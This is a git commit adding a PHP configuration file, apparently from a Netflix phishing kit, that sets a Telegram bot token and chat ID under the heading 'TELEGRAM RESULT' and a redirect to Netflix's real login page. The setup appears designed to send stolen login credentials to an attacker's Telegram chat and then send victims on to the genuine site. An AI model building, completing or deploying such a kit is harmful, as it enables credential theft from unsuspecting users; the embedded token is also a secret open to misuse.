55c1cf7e700a106b0db32afb945b53ca32e13ea8
darknethaxor <72026007+darknethaxor@users.noreply.github.com>
2022-03-28 13:56:27 +0600

    Add files via upload

---
+++ sites/config.php
@@ -0,0 +1,11 @@
+<?php
+
+##### TELEGRAM RESULT #####
+
+$Token = "1688328724:AAFhm-QGXI5cR_RBRXvtkTj8OwrCnITOuNI";  
+
+$Id = "1802897390";
+
+$RedirectUrl = "https://www.netflix.com/Login"; 
+
+?>
